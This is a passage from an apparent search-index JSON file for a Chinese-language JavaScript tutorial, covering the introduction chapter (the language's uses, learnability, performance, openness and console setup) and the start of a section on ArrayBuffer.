\u8bed\u8a00\u6709\u4e00\u4e9b\u663e\u8457\u7279\u70b9\uff0c\u4f7f\u5f97\u5b83\u975e\u5e38\u503c\u5f97\u5b66\u4e60\u3002\u5b83\u65e2\u9002\u5408\u4f5c\u4e3a\u5b66\u4e60\u7f16\u7a0b\u7684\u5165\u95e8\u8bed\u8a00\uff0c\u4e5f\u9002\u5408\u5f53\u4f5c\u65e5\u5e38\u5f00\u53d1\u7684\u5de5\u4f5c\u8bed\u8a00\u3002\u5b83\u662f\u76ee\u524d\u6700\u6709\u5e0c\u671b\u3001\u524d\u9014\u6700\u5149\u660e\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\u4e4b\u4e00\u3002","title":"\u4e3a\u4ec0\u4e48\u5b66\u4e60 JavaScript\uff1f"},{"location":"basic/introduction/#_2","text":"JavaScript \u7684\u53d1\u660e\u76ee\u7684\uff0c\u5c31\u662f\u4f5c\u4e3a\u6d4f\u89c8\u5668\u7684\u5185\u7f6e\u811a\u672c\u8bed\u8a00\uff0c\u4e3a\u7f51\u9875\u5f00\u53d1\u8005\u63d0\u4f9b\u64cd\u63a7\u6d4f\u89c8\u5668\u7684\u80fd\u529b\u3002\u5b83\u662f\u76ee\u524d\u552f\u4e00\u4e00\u79cd\u901a\u7528\u7684\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\uff0c\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u3002\u5b83\u53ef\u4ee5\u8ba9\u7f51\u9875\u5448\u73b0\u5404\u79cd\u7279\u6b8a\u6548\u679c\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u826f\u597d\u7684\u4e92\u52a8\u4f53\u9a8c\u3002 \u76ee\u524d\uff0c\u5168\u4e16\u754c\u51e0\u4e4e\u6240\u6709\u7f51\u9875\u90fd\u4f7f\u7528 JavaScript\u3002\u5982\u679c\u4e0d\u7528\uff0c\u7f51\u7ad9\u7684\u6613\u7528\u6027\u548c\u4f7f\u7528\u6548\u7387\u5c06\u5927\u6253\u6298\u6263\uff0c\u65e0\u6cd5\u6210\u4e3a\u64cd\u4f5c\u4fbf\u5229\u3001\u5bf9\u7528\u6237\u53cb\u597d\u7684\u7f51\u7ad9\u3002 \u5bf9\u4e8e\u4e00\u4e2a\u4e92\u8054\u7f51\u5f00\u53d1\u8005\u6765\u8bf4\uff0c\u5982\u679c\u4f60\u60f3\u63d0\u4f9b\u6f02\u4eae\u7684\u7f51\u9875\u3001\u4ee4\u7528\u6237\u6ee1\u610f\u7684\u4e0a\u7f51\u4f53\u9a8c\u3001\u5404\u79cd\u57fa\u4e8e\u6d4f\u89c8\u5668\u7684\u4fbf\u6377\u529f\u80fd\u3001\u524d\u540e\u7aef\u4e4b\u95f4\u7d27\u5bc6\u9ad8\u6548\u7684\u8054\u7cfb\uff0cJavaScript \u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u5de5\u5177\u3002","title":"\u64cd\u63a7\u6d4f\u89c8\u5668\u7684\u80fd\u529b"},{"location":"basic/introduction/#_3","text":"\u8fd1\u5e74\u6765\uff0cJavaScript \u7684\u4f7f\u7528\u8303\u56f4\uff0c\u6162\u6162\u8d85\u8d8a\u4e86\u6d4f\u89c8\u5668\uff0c\u6b63\u5728\u5411\u901a\u7528\u7684\u7cfb\u7edf\u8bed\u8a00\u53d1\u5c55\u3002 \uff081\uff09\u6d4f\u89c8\u5668\u7684\u5e73\u53f0\u5316 \u968f\u7740 HTML5 \u7684\u51fa\u73b0\uff0c\u6d4f\u89c8\u5668\u672c\u8eab\u7684\u529f\u80fd\u8d8a\u6765\u8d8a\u5f3a\uff0c\u4e0d\u518d\u4ec5\u4ec5\u80fd\u6d4f\u89c8\u7f51\u9875\uff0c\u800c\u662f\u8d8a\u6765\u8d8a\u50cf\u4e00\u4e2a\u5e73\u53f0\uff0cJavaScript \u56e0\u6b64\u5f97\u4ee5\u8c03\u7528\u8bb8\u591a\u7cfb\u7edf\u529f\u80fd\uff0c\u6bd4\u5982\u64cd\u4f5c\u672c\u5730\u6587\u4ef6\u3001\u64cd\u4f5c\u56fe\u7247\u3001\u8c03\u7528\u6444\u50cf\u5934\u548c\u9ea6\u514b\u98ce\u7b49\u7b49\u3002\u8fd9\u4f7f\u5f97 JavaScript \u53ef\u4ee5\u5b8c\u6210\u8bb8\u591a\u4ee5\u524d\u65e0\u6cd5\u60f3\u8c61\u7684\u4e8b\u60c5\u3002 \uff082\uff09Node Node \u9879\u76ee\u4f7f\u5f97 JavaScript \u53ef\u4ee5\u7528\u4e8e\u5f00\u53d1\u670d\u52a1\u5668\u7aef\u7684\u5927\u578b\u9879\u76ee\uff0c\u7f51\u7ad9\u7684\u524d\u540e\u7aef\u90fd\u7528 JavaScript \u5f00\u53d1\u5df2\u7ecf\u6210\u4e3a\u4e86\u73b0\u5b9e\u3002\u6709\u4e9b\u5d4c\u5165\u5f0f\u5e73\u53f0\uff08Raspberry Pi\uff09\u80fd\u591f\u5b89\u88c5 Node\uff0c\u4e8e\u662f JavaScript \u5c31\u80fd\u4e3a\u8fd9\u4e9b\u5e73\u53f0\u5f00\u53d1\u5e94\u7528\u7a0b\u5e8f\u3002 \uff083\uff09\u6570\u636e\u5e93\u64cd\u4f5c JavaScript \u751a\u81f3\u4e5f\u53ef\u4ee5\u7528\u6765\u64cd\u4f5c\u6570\u636e\u5e93\u3002NoSQL \u6570\u636e\u5e93\u8fd9\u4e2a\u6982\u5ff5\uff0c\u672c\u8eab\u5c31\u662f\u5728 JSON\uff08JavaScript Object Notation\uff09\u683c\u5f0f\u7684\u57fa\u7840\u4e0a\u8bde\u751f\u7684\uff0c\u5927\u90e8\u5206 NoSQL \u6570\u636e\u5e93\u5141\u8bb8 JavaScript \u76f4\u63a5\u64cd\u4f5c\u3002\u57fa\u4e8e SQL \u8bed\u8a00\u7684\u5f00\u6e90\u6570\u636e\u5e93 PostgreSQL \u652f\u6301 JavaScript \u4f5c\u4e3a\u64cd\u4f5c\u8bed\u8a00\uff0c\u53ef\u4ee5\u90e8\u5206\u53d6\u4ee3 SQL \u67e5\u8be2\u8bed\u8a00\u3002 \uff084\uff09\u79fb\u52a8\u5e73\u53f0\u5f00\u53d1 JavaScript \u4e5f\u6b63\u5728\u6210\u4e3a\u624b\u673a\u5e94\u7528\u7684\u5f00\u53d1\u8bed\u8a00\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5b89\u5353\u5e73\u53f0\u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0ciOS \u5e73\u53f0\u4f7f\u7528 Objective-C \u6216 Swift \u8bed\u8a00\u5f00\u53d1\u3002\u8bb8\u591a\u4eba\u6b63\u5728\u52aa\u529b\uff0c\u8ba9 JavaScript \u6210\u4e3a\u5404\u4e2a\u5e73\u53f0\u7684\u901a\u7528\u5f00\u53d1\u8bed\u8a00\u3002 PhoneGap \u9879\u76ee\u5c31\u662f\u5c06 JavaScript \u548c HTML5 \u6253\u5305\u5728\u4e00\u4e2a\u5bb9\u5668\u4e4b\u4e2d\uff0c\u4f7f\u5f97\u5b83\u80fd\u540c\u65f6\u5728 iOS \u548c\u5b89\u5353\u4e0a\u8fd0\u884c\u3002Facebook \u516c\u53f8\u7684 React Native \u9879\u76ee\u5219\u662f\u5c06 JavaScript \u5199\u7684\u7ec4\u4ef6\uff0c\u7f16\u8bd1\u6210\u539f\u751f\u7ec4\u4ef6\uff0c\u4ece\u800c\u4f7f\u5b83\u4eec\u5177\u5907\u4f18\u79c0\u7684\u6027\u80fd\u3002 Mozilla \u57fa\u91d1\u4f1a\u7684\u624b\u673a\u64cd\u4f5c\u7cfb\u7edf Firefox OS\uff0c\u66f4\u662f\u76f4\u63a5\u5c06 JavaScript \u4f5c\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u5e73\u53f0\u8bed\u8a00\uff0c\u4f46\u662f\u5f88\u53ef\u60dc\u8fd9\u4e2a\u9879\u76ee\u6ca1\u6709\u6210\u529f\u3002 \uff085\uff09\u5185\u5d4c\u811a\u672c\u8bed\u8a00 \u8d8a\u6765\u8d8a\u591a\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5c06 JavaScript \u4f5c\u4e3a\u5185\u5d4c\u7684\u811a\u672c\u8bed\u8a00\uff0c\u6bd4\u5982 Adobe \u516c\u53f8\u7684\u8457\u540d PDF \u9605\u8bfb\u5668 Acrobat\u3001Linux \u684c\u9762\u73af\u5883 GNOME 3\u3002 \uff086\uff09\u8de8\u5e73\u53f0\u7684\u684c\u9762\u5e94\u7528\u7a0b\u5e8f Chromium OS\u3001Windows 8 \u7b49\u64cd\u4f5c\u7cfb\u7edf\u76f4\u63a5\u652f\u6301 JavaScript \u7f16\u5199\u5e94\u7528\u7a0b\u5e8f\u3002Mozilla \u7684 Open Web Apps \u9879\u76ee\u3001Google \u7684 Chrome App \u9879\u76ee \u3001GitHub \u7684 Electron \u9879\u76ee \u3001\u4ee5\u53ca TideSDK \u9879\u76ee \uff0c\u90fd\u53ef\u4ee5\u7528\u6765\u7f16\u5199\u8fd0\u884c\u4e8e Windows\u3001Mac OS \u548c Android \u7b49\u591a\u4e2a\u684c\u9762\u5e73\u53f0\u7684\u7a0b\u5e8f\uff0c\u4e0d\u4f9d\u8d56\u6d4f\u89c8\u5668\u3002 \uff087\uff09\u5c0f\u7ed3 \u53ef\u4ee5\u9884\u671f\uff0cJavaScript \u6700\u7ec8\u5c06\u80fd\u8ba9\u4f60\u53ea\u7528\u4e00\u79cd\u8bed\u8a00\uff0c\u5c31\u5f00\u53d1\u51fa\u9002\u5e94\u4e0d\u540c\u5e73\u53f0\uff08\u5305\u62ec\u684c\u9762\u7aef\u3001\u670d\u52a1\u5668\u7aef\u3001\u624b\u673a\u7aef\uff09\u7684\u7a0b\u5e8f\u3002\u65e9\u57282013\u5e749\u6708\u7684 \u7edf\u8ba1 \u4e4b\u4e2d\uff0cJavaScript \u5c31\u662f\u5f53\u5e74 GitHub \u4e0a\u4f7f\u7528\u91cf\u6392\u540d\u7b2c\u4e00\u7684\u8bed\u8a00\u3002 \u8457\u540d\u7a0b\u5e8f\u5458 Jeff Atwood \u751a\u81f3\u63d0\u51fa\u4e86\u4e00\u6761 \u201cAtwood \u5b9a\u5f8b\u201d \uff1a \u201c\u6240\u6709\u53ef\u4ee5\u7528 JavaScript \u7f16\u5199\u7684\u7a0b\u5e8f\uff0c\u6700\u7ec8\u90fd\u4f1a\u51fa\u73b0 JavaScript \u7684\u7248\u672c\u3002\u201d(Any application that can be written in JavaScript will eventually be written in JavaScript.)","title":"\u5e7f\u6cdb\u7684\u4f7f\u7528\u9886\u57df"},{"location":"basic/introduction/#_4","text":"\u76f8\u6bd4\u5b66\u4e60\u5176\u4ed6\u8bed\u8a00\uff0c\u5b66\u4e60 JavaScript \u6709\u4e00\u4e9b\u6709\u5229\u6761\u4ef6\u3002 \uff081\uff09\u5b66\u4e60\u73af\u5883\u65e0\u5904\u4e0d\u5728 \u53ea\u8981\u6709\u6d4f\u89c8\u5668\uff0c\u5c31\u80fd\u8fd0\u884c JavaScript \u7a0b\u5e8f\uff1b\u53ea\u8981\u6709\u6587\u672c\u7f16\u8f91\u5668\uff0c\u5c31\u80fd\u7f16\u5199 JavaScript \u7a0b\u5e8f\u3002\u8fd9\u610f\u5473\u7740\uff0c\u51e0\u4e4e\u6240\u6709\u7535\u8111\u90fd\u539f\u751f\u63d0\u4f9b JavaScript \u5b66\u4e60\u73af\u5883\uff0c\u4e0d\u7528\u53e6\u884c\u5b89\u88c5\u590d\u6742\u7684 IDE\uff08\u96c6\u6210\u5f00\u53d1\u73af\u5883\uff09\u548c\u7f16\u8bd1\u5668\u3002 \uff082\uff09\u7b80\u5355\u6027 \u76f8\u6bd4\u5176\u4ed6\u811a\u672c\u8bed\u8a00\uff08\u6bd4\u5982 Python \u6216 Ruby\uff09\uff0cJavaScript \u7684\u8bed\u6cd5\u76f8\u5bf9\u7b80\u5355\u4e00\u4e9b\uff0c\u672c\u8eab\u7684\u8bed\u6cd5\u7279\u6027\u5e76\u4e0d\u662f\u7279\u522b\u591a\u3002\u800c\u4e14\uff0c\u90a3\u4e9b\u8bed\u6cd5\u4e2d\u7684\u590d\u6742\u90e8\u5206\uff0c\u4e5f\u4e0d\u662f\u5fc5\u9700\u8981\u5b66\u4f1a\u3002\u4f60\u5b8c\u5168\u53ef\u4ee5\u53ea\u7528\u7b80\u5355\u547d\u4ee4\uff0c\u5b8c\u6210\u5927\u90e8\u5206\u7684\u64cd\u4f5c\u3002 \uff083\uff09\u4e0e\u4e3b\u6d41\u8bed\u8a00\u7684\u76f8\u4f3c\u6027 JavaScript \u7684\u8bed\u6cd5\u5f88\u7c7b\u4f3c C/C++ \u548c Java\uff0c\u5982\u679c\u5b66\u8fc7\u8fd9\u4e9b\u8bed\u8a00\uff08\u4e8b\u5b9e\u4e0a\u5927\u591a\u6570\u5b66\u6821\u90fd\u6559\uff09\uff0cJavaScript \u7684\u5165\u95e8\u4f1a\u975e\u5e38\u5bb9\u6613\u3002 \u5fc5\u987b\u8bf4\u660e\u7684\u662f\uff0c\u867d\u7136\u6838\u5fc3\u8bed\u6cd5\u4e0d\u96be\uff0c\u4f46\u662f JavaScript \u7684\u590d\u6742\u6027\u4f53\u73b0\u5728\u53e6\u5916\u4e24\u4e2a\u65b9\u9762\u3002 \u9996\u5148\uff0c\u5b83\u6d89\u53ca\u5927\u91cf\u7684\u5916\u90e8 API\u3002JavaScript \u8981\u53d1\u6325\u4f5c\u7528\uff0c\u5fc5\u987b\u4e0e\u5176\u4ed6\u7ec4\u4ef6\u914d\u5408\uff0c\u8fd9\u4e9b\u5916\u90e8\u7ec4\u4ef6\u4e94\u82b1\u516b\u95e8\uff0c\u6570\u91cf\u6781\u5176\u5e9e\u5927\uff0c\u51e0\u4e4e\u6d89\u53ca\u7f51\u7edc\u5e94\u7528\u7684\u5404\u4e2a\u65b9\u9762\uff0c\u638c\u63e1\u5b83\u4eec\u7edd\u975e\u6613\u4e8b\u3002 \u5176\u6b21\uff0cJavaScript \u8bed\u8a00\u6709\u4e00\u4e9b\u8bbe\u8ba1\u7f3a\u9677\u3002\u67d0\u4e9b\u5730\u65b9\u76f8\u5f53\u4e0d\u5408\u7406\uff0c\u53e6\u4e00\u4e9b\u5730\u65b9\u5219\u4f1a\u51fa\u73b0\u602a\u5f02\u7684\u8fd0\u884c\u7ed3\u679c\u3002\u5b66\u4e60 JavaScript\uff0c\u5f88\u5927\u4e00\u90e8\u5206\u65f6\u95f4\u662f\u7528\u6765\u641e\u6e05\u695a\u54ea\u4e9b\u5730\u65b9\u6709\u9677\u9631\u3002Douglas Crockford \u5199\u8fc7\u4e00\u672c\u6709\u540d\u7684\u4e66\uff0c\u540d\u5b57\u5c31\u53eb \u300aJavaScript: The Good Parts\u300b \uff0c\u8a00\u4e0b\u4e4b\u610f\u5c31\u662f\u8fd9\u95e8\u8bed\u8a00\u4e0d\u597d\u7684\u5730\u65b9\u5f88\u591a\uff0c\u5fc5\u987b\u5199\u4e00\u672c\u4e66\u624d\u80fd\u8bb2\u6e05\u695a\u3002\u53e6\u5916\u4e00\u4e9b\u7a0b\u5e8f\u5458\u5219\u611f\u5230\uff0c\u4e3a\u4e86\u66f4\u5408\u7406\u5730\u7f16\u5199 JavaScript \u7a0b\u5e8f\uff0c\u5c31\u4e0d\u80fd\u7528 JavaScript \u6765\u5199\uff0c\u800c\u5fc5\u987b\u53d1\u660e\u65b0\u7684\u8bed\u8a00\uff0c\u6bd4\u5982 CoffeeScript\u3001TypeScript\u3001Dart \u8fd9\u4e9b\u65b0\u8bed\u8a00\u7684\u53d1\u660e\u76ee\u7684\uff0c\u591a\u591a\u5c11\u5c11\u90fd\u6709\u8fd9\u4e2a\u56e0\u7d20\u3002 \u5c3d\u7ba1\u5982\u6b64\uff0c\u76ee\u524d\u770b\u6765\uff0cJavaScript \u7684\u5730\u4f4d\u8fd8\u662f\u65e0\u6cd5\u52a8\u6447\u3002\u52a0\u4e4b\uff0c\u8bed\u8a00\u6807\u51c6\u7684\u5feb\u901f\u8fdb\u5316\uff0c\u4f7f\u5f97 JavaScript \u529f\u80fd\u65e5\u76ca\u589e\u5f3a\uff0c\u800c\u8bed\u6cd5\u7f3a\u9677\u548c\u602a\u5f02\u4e4b\u5904\u5f97\u5230\u4e86\u5f25\u8865\u3002\u6240\u4ee5\uff0cJavaScript \u8fd8\u662f\u503c\u5f97\u5b66\u4e60\uff0c\u51b5\u4e14\u5b83\u7684\u5165\u95e8\u771f\u7684\u4e0d\u96be\u3002","title":"\u6613\u5b66\u6027"},{"location":"basic/introduction/#_5","text":"JavaScript \u7684\u6027\u80fd\u4f18\u52bf\u4f53\u73b0\u5728\u4ee5\u4e0b\u65b9\u9762\u3002 \uff081\uff09\u7075\u6d3b\u7684\u8bed\u6cd5\uff0c\u8868\u8fbe\u529b\u5f3a\u3002 JavaScript \u65e2\u652f\u6301\u7c7b\u4f3c C \u8bed\u8a00\u6e05\u6670\u7684\u8fc7\u7a0b\u5f0f\u7f16\u7a0b\uff0c\u4e5f\u652f\u6301\u7075\u6d3b\u7684\u51fd\u6570\u5f0f\u7f16\u7a0b\uff0c\u53ef\u4ee5\u7528\u6765\u5199\u5e76\u53d1\u5904\u7406\uff08concurrent\uff09\u3002\u8fd9\u4e9b\u8bed\u6cd5\u7279\u6027\u5df2\u7ecf\u88ab\u8bc1\u660e\u975e\u5e38\u5f3a\u5927\uff0c\u53ef\u4ee5\u7528\u4e8e\u8bb8\u591a\u573a\u5408\uff0c\u5c24\u5176\u9002\u7528\u5f02\u6b65\u7f16\u7a0b\u3002 JavaScript \u7684\u6240\u6709\u503c\u90fd\u662f\u5bf9\u8c61\uff0c\u8fd9\u4e3a\u7a0b\u5e8f\u5458\u63d0\u4f9b\u4e86\u7075\u6d3b\u6027\u548c\u4fbf\u5229\u6027\u3002\u56e0\u4e3a\u4f60\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u3001\u6309\u7167\u9700\u8981\u968f\u65f6\u521b\u9020\u6570\u636e\u7ed3\u6784\uff0c\u4e0d\u7528\u8fdb\u884c\u9ebb\u70e6\u7684\u9884\u5b9a\u4e49\u3002 JavaScript \u7684\u6807\u51c6\u8fd8\u5728\u5feb\u901f\u8fdb\u5316\u4e2d\uff0c\u5e76\u4e0d\u65ad\u5408\u7406\u5316\uff0c\u6dfb\u52a0\u66f4\u9002\u7528\u7684\u8bed\u6cd5\u7279\u6027\u3002 \uff082\uff09\u652f\u6301\u7f16\u8bd1\u8fd0\u884c\u3002 JavaScript \u8bed\u8a00\u672c\u8eab\uff0c\u867d\u7136\u662f\u4e00\u79cd\u89e3\u91ca\u578b\u8bed\u8a00\uff0c\u4f46\u662f\u5728\u73b0\u4ee3\u6d4f\u89c8\u5668\u4e2d\uff0cJavaScript \u90fd\u662f\u7f16\u8bd1\u540e\u8fd0\u884c\u3002\u7a0b\u5e8f\u4f1a\u88ab\u9ad8\u5ea6\u4f18\u5316\uff0c\u8fd0\u884c\u6548\u7387\u63a5\u8fd1\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u3002\u800c\u4e14\uff0cJavaScript \u5f15\u64ce\u6b63\u5728\u5feb\u901f\u53d1\u5c55\uff0c\u6027\u80fd\u5c06\u8d8a\u6765\u8d8a\u597d\u3002 \u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u79cd WebAssembly \u683c\u5f0f\uff0c\u5b83\u662f JavaScript \u5f15\u64ce\u7684\u4e2d\u95f4\u7801\u683c\u5f0f\uff0c\u5168\u90e8\u90fd\u662f\u4e8c\u8fdb\u5236\u4ee3\u7801\u3002\u7531\u4e8e\u8df3\u8fc7\u4e86\u7f16\u8bd1\u6b65\u9aa4\uff0c\u53ef\u4ee5\u8fbe\u5230\u63a5\u8fd1\u539f\u751f\u4e8c\u8fdb\u5236\u4ee3\u7801\u7684\u8fd0\u884c\u901f\u5ea6\u3002\u5404\u79cd\u8bed\u8a00\uff08\u4e3b\u8981\u662f C \u548c C++\uff09\u901a\u8fc7\u7f16\u8bd1\u6210 WebAssembly\uff0c\u5c31\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u91cc\u9762\u8fd0\u884c\u3002 \uff083\uff09\u4e8b\u4ef6\u9a71\u52a8\u548c\u975e\u963b\u585e\u5f0f\u8bbe\u8ba1\u3002 JavaScript \u7a0b\u5e8f\u53ef\u4ee5\u91c7\u7528\u4e8b\u4ef6\u9a71\u52a8\uff08event-driven\uff09\u548c\u975e\u963b\u585e\u5f0f\uff08non-blocking\uff09\u8bbe\u8ba1\uff0c\u5728\u670d\u52a1\u5668\u7aef\u9002\u5408\u9ad8\u5e76\u53d1\u73af\u5883\uff0c\u666e\u901a\u7684\u786c\u4ef6\u5c31\u53ef\u4ee5\u627f\u53d7\u5f88\u5927\u7684\u8bbf\u95ee\u91cf\u3002","title":"\u5f3a\u5927\u7684\u6027\u80fd"},{"location":"basic/introduction/#_6","text":"JavaScript \u662f\u4e00\u79cd\u5f00\u653e\u7684\u8bed\u8a00\u3002\u5b83\u7684\u6807\u51c6 ECMA-262 \u662f ISO \u56fd\u9645\u6807\u51c6\uff0c\u5199\u5f97\u975e\u5e38\u8be6\u5c3d\u660e\u786e\uff1b\u8be5\u6807\u51c6\u7684\u4e3b\u8981\u5b9e\u73b0\uff08\u6bd4\u5982 V8 \u548c SpiderMonkey \u5f15\u64ce\uff09\u90fd\u662f\u5f00\u653e\u7684\uff0c\u800c\u4e14\u8d28\u91cf\u5f88\u9ad8\u3002\u8fd9\u4fdd\u8bc1\u4e86\u8fd9\u95e8\u8bed\u8a00\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u516c\u53f8\u6216\u4e2a\u4eba\uff0c\u4e0d\u5b58\u5728\u7248\u6743\u548c\u4e13\u5229\u7684\u95ee\u9898\u3002 \u8bed\u8a00\u6807\u51c6\u7531 TC39 \u59d4\u5458\u4f1a\u8d1f\u8d23\u5236\u5b9a\uff0c\u8be5\u59d4\u5458\u4f1a\u7684\u8fd0\u4f5c\u662f\u900f\u660e\u7684\uff0c\u6240\u6709\u8ba8\u8bba\u90fd\u662f\u5f00\u653e\u7684\uff0c\u4f1a\u8bae\u8bb0\u5f55\u90fd\u4f1a\u5bf9\u5916\u516c\u5e03\u3002 \u4e0d\u540c\u516c\u53f8\u7684 JavaScript \u8fd0\u884c\u73af\u5883\uff0c\u517c\u5bb9\u6027\u5f88\u597d\uff0c\u7a0b\u5e8f\u4e0d\u505a\u8c03\u6574\u6216\u53ea\u505a\u5f88\u5c0f\u7684\u8c03\u6574\uff0c\u5c31\u80fd\u5728\u6240\u6709\u6d4f\u89c8\u5668\u4e0a\u8fd0\u884c\u3002","title":"\u5f00\u653e\u6027"},{"location":"basic/introduction/#_7","text":"\u5168\u4e16\u754c\u7a0b\u5e8f\u5458\u90fd\u5728\u4f7f\u7528 JavaScript\uff0c\u5b83\u6709\u7740\u6781\u5927\u7684\u793e\u533a\u3001\u5e7f\u6cdb\u7684\u6587\u732e\u548c\u56fe\u4e66\u3001\u4e30\u5bcc\u7684\u4ee3\u7801\u8d44\u6e90\u3002\u7edd\u5927\u90e8\u5206\u4f60\u9700\u8981\u7528\u5230\u7684\u529f\u80fd\uff0c\u90fd\u6709\u591a\u4e2a\u5f00\u6e90\u51fd\u6570\u5e93\u53ef\u4f9b\u9009\u7528\u3002 \u4f5c\u4e3a\u9879\u76ee\u8d1f\u8d23\u4eba\uff0c\u4f60\u4e0d\u96be\u62db\u8058\u5230\u6570\u91cf\u4f17\u591a\u7684 JavaScript \u7a0b\u5e8f\u5458\uff1b\u4f5c\u4e3a\u5f00\u53d1\u8005\uff0c\u4f60\u4e5f\u4e0d\u96be\u627e\u5230\u4e00\u4efd JavaScript \u7684\u5de5\u4f5c\u3002","title":"\u793e\u533a\u652f\u6301\u548c\u5c31\u4e1a\u673a\u4f1a"},{"location":"basic/introduction/#_8","text":"\u672c\u6559\u7a0b\u5305\u542b\u5927\u91cf\u7684\u793a\u4f8b\u4ee3\u7801\uff0c\u53ea\u8981\u7535\u8111\u5b89\u88c5\u4e86\u6d4f\u89c8\u5668\uff0c\u5c31\u53ef\u4ee5\u7528\u6765\u5b9e\u9a8c\u4e86\u3002\u8bfb\u8005\u53ef\u4ee5\u4e00\u8fb9\u8bfb\u4e00\u8fb9\u8fd0\u884c\u793a\u4f8b\uff0c\u52a0\u6df1\u7406\u89e3\u3002 \u63a8\u8350\u5b89\u88c5 Chrome \u6d4f\u89c8\u5668\uff0c\u5b83\u7684\u201c\u5f00\u53d1\u8005\u5de5\u5177\u201d\uff08Developer Tools\uff09\u91cc\u9762\u7684\u201c\u63a7\u5236\u53f0\u201d\uff08console\uff09\uff0c\u5c31\u662f\u8fd0\u884c JavaScript \u4ee3\u7801\u7684\u7406\u60f3\u73af\u5883\u3002 \u8fdb\u5165 Chrome \u6d4f\u89c8\u5668\u7684\u201c\u63a7\u5236\u53f0\u201d\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u3002 \u76f4\u63a5\u8fdb\u5165\uff1a\u6309\u4e0b Option + Command + J \uff08Mac\uff09\u6216\u8005 Ctrl + Shift + J \uff08Windows / Linux\uff09 \u5f00\u53d1\u8005\u5de5\u5177\u8fdb\u5165\uff1a\u5f00\u53d1\u8005\u5de5\u5177\u7684\u5feb\u6377\u952e\u662f F12\uff0c\u6216\u8005 Option + Command + I \uff08Mac\uff09\u4ee5\u53ca Ctrl + Shift + I \uff08Windows / Linux\uff09\uff0c\u7136\u540e\u9009\u62e9 Console \u9762\u677f \u8fdb\u5165\u63a7\u5236\u53f0\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u5728\u63d0\u793a\u7b26\u540e\u8f93\u5165\u4ee3\u7801\uff0c\u7136\u540e\u6309 Enter \u952e\uff0c\u4ee3\u7801\u5c31\u4f1a\u6267\u884c\u3002\u5982\u679c\u6309 Shift + Enter \u952e\uff0c\u5c31\u662f\u4ee3\u7801\u6362\u884c\uff0c\u4e0d\u4f1a\u89e6\u53d1\u6267\u884c\u3002\u5efa\u8bae\u9605\u8bfb\u672c\u6559\u7a0b\u65f6\uff0c\u5c06\u4ee3\u7801\u590d\u5236\u5230\u63a7\u5236\u53f0\u8fdb\u884c\u5b9e\u9a8c\u3002 \u4f5c\u4e3a\u5c1d\u8bd5\uff0c\u4f60\u53ef\u4ee5\u5c06\u4e0b\u9762\u7684\u7a0b\u5e8f\u590d\u5236\u5230\u201c\u63a7\u5236\u53f0\u201d\uff0c\u6309\u4e0b\u56de\u8f66\u540e\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u8fd0\u884c\u7ed3\u679c\u3002 1 2 3 4 5 6 function greetMe ( yourName ) { console . log ( 'Hello ' + yourName ); } greetMe ( 'World' ) // Hello World","title":"\u5b9e\u9a8c\u73af\u5883"},{"location":"bom/arraybuffer/","text":"ArrayBuffer \u5bf9\u8c61\uff0cBlob \u5bf9\u8c61 \u00b6 ArrayBuffer \u5bf9\u8c61 \u00b6 ArrayBuffer \u5bf9\u8c61\u8868\u793a\u4e00\u6bb5\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u7528\u6765\u6a21\u62df\u5185\u5b58\u91cc\u9762\u7684\u6570\u636e\u3002\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\uff0cJavaScript \u53ef\u4ee5\u8bfb\u5199\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u770b\u4f5c\u5185\u5b58\u6570\u636e\u7684\u8868\u8fbe\u3002 \u8fd9\u4e2a\u5bf9\u8c61\u662f ES6 \u624d\u5199\u5165\u6807\u51c6\u7684\uff0c\u666e\u901a\u7684\u7f51\u9875\u7f16\u7a0b\u7528\u4e0d\u5230\u5b83\uff0c\u4e3a\u4e86\u6559\u7a0b\u4f53\u7cfb\u7684\u5b8c\u6574\uff0c\u4e0b\u9762\u53ea\u63d0\u4f9b\u4e00\u4e2a\u7b80\u7565\u7684\u4ecb\u7ecd\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\u300aES6 \u6807\u51c6\u5165\u95e8\u300b\u91cc\u9762\u7684\u7ae0\u8282\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b ArrayBuffer() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u5b9e\u4f8b\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u8fd9\u6bb5\u4e8c\u8fdb\u5236\u6570\u636e\u5360\u7528\u591a\u5c11\u4e2a\u5b57\u8282\u3002 1 var buffer = new ArrayBuffer ( 8 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61 buffer \u5360\u75288\u4e2a\u5b57\u8282\u3002 ArrayBuffer \u5bf9\u8c61\u6709\u5b9e\u4f8b\u5c5e\u6027 byteLength \uff0c\u8868\u793a\u5f53\u524d\u5b9e\u4f8b\u5360\u7528\u7684\u5185\u5b58\u957f\u5ea6\uff08\u5355\u4f4d\u5b57\u8282\uff09\u3002 1 2 var buffer = new ArrayBuffer ( 8 ); buffer . byteLength // 8 ArrayBuffer \u5bf9\u8c61\u6709\u5b9e\u4f8b\u65b9\u6cd5 slice() 